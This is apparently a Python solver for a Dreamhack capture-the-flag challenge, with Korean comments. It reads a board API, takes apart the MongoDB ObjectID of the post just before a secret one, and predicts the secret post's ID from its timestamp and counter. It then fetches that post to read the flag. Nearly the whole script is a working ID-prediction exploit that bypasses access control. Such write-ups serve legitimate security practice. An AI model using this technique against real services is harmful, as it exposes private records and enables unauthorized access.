import requests
from datetime import datetime, timezone
import sys

def solve_mongoboard_smart():
    # ★ 문제 환경에 맞게 포트 번호를 수정하세요 ★
    url = "http://host8.dreamhack.games:14508"
    
    print("[DEBUG] ================= 시작 =================")
    print("[DEBUG] 브루트포스 없이 앞뒤 게시물의 패턴을 분석하여 ID를 유추합니다.")
    
    try:
        r = requests.get(f"{url}/api/board", timeout=5)
        boards = r.json()
    except Exception as e:
        print(f"[ERROR] 서버 접속 실패: {e}")
        sys.exit(1)
        
    # 목록에서 비밀 게시글과 그 바로 앞(previous) 게시글 찾기
    secret_idx = -1
    for i, b in enumerate(boards):
        if b.get('secret') == True:
            secret_idx = i
            break
            
    if secret_idx == -1:
        print("[ERROR] 비밀 게시글을 찾을 수 없습니다.")
        sys.exit(1)
        
    if secret_idx == 0:
        print("[ERROR] 비밀 게시글이 첫 번째라 앞 게시물 정보가 없습니다.")
        sys.exit(1)
        
    target_post = boards[secret_idx]
    prev_post = boards[secret_idx - 1]
    
    # 1. 앞 게시물의 ObjectID 구조 분해
    prev_id = prev_post['_id']
    prev_ts_hex = prev_id[0:8]
    machine_pid = prev_id[8:18]
    prev_counter_hex = prev_id[18:24]
    
    prev_ts = int(prev_ts_hex, 16)
    prev_counter = int(prev_counter_hex, 16)
    
    print(f"\n[DEBUG] --- 앞 게시글 분석 ---")
    print(f"[DEBUG] ID: {prev_id}")
    print(f"[DEBUG] Machine+PID: {machine_pid}")
    print(f"[DEBUG] Counter: {prev_counter_hex} (10진수: {prev_counter})")
    
    # 2. 타임스탬프 차이 계산
    def get_unix_ts(date_str):
        if "." in date_str:
            dt = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        else:
            dt = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%SZ")
        dt = dt.replace(tzinfo=timezone.utc)
        return int(dt.timestamp())
        
    prev_unix = get_unix_ts(prev_post['publish_date'])
    target_unix = get_unix_ts(target_post['publish_date'])
    time_diff = target_unix - prev_unix
    
    print(f"\n[DEBUG] --- 시간 차이 계산 ---")
    print(f"[DEBUG] 두 게시물 작성 시간 차이: {time_diff}초")
    
    # 3. 비밀 게시글(Target)의 ID 조합
    # Timestamp: 앞 게시물 TS + 시간 차이
    target_ts_hex = f"{prev_ts + time_diff:08x}"
    
    # Counter: 앞 게시물 바로 다음이므로 + 1
    target_counter_hex = f"{prev_counter + 1:06x}"
    
    # ID 조립!
    target_id = target_ts_hex + machine_pid + target_counter_hex
    
    print(f"\n[DEBUG] --- 최종 타겟 ID 예측 ---")
    print(f"[DEBUG] 예측된 타겟 ID: {target_id}")
    
    # 4. 검증 및 플래그 획득
    print("\n[DEBUG] 예측한 ID로 서버에 요청을 보냅니다...")
    resp = requests.get(f"{url}/api/board/{target_id}")
    
    if resp.status_code == 200 and 'body' in resp.json():
        print(f"\n[SUCCESS] 🎉 완벽하게 예측했습니다!")
        print(f"==================================================")
        print(f"[FLAG] {resp.json()['body']}")
        print(f"==================================================")
    else:
        print(f"\n[FAIL] 예측 실패. HTTP {resp.status_code}")
        print("시간 계산에 약간의 오차가 있을 수 있습니다. (예: +1초 또는 -1초)")

if __name__ == '__main__':
    solve_mongoboard_smart()